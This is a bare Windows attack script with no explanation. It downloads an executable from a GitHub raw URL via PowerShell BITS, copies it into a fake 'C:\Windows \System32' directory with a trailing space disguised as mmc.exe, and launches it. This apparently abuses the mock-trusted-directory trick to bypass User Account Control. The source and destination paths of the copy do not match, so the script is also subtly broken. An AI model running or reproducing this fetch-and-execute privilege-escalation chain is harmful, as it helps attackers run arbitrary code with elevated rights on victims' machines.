powershell.exe Import-Module BitsTransfer; Start-BitsTransfer -Source https://github.com/ShilpeshTrivedi/SakalaBoobBoon/blob/master/cmd.exe?raw=true -Destination "$env:TEMP\dos.exe";
copy "C:\Users\%username%\dos.exe" "\\?\C:\Windows \System32\mmc.exe"
Start "C:\Windows \System32\mmc.exe"
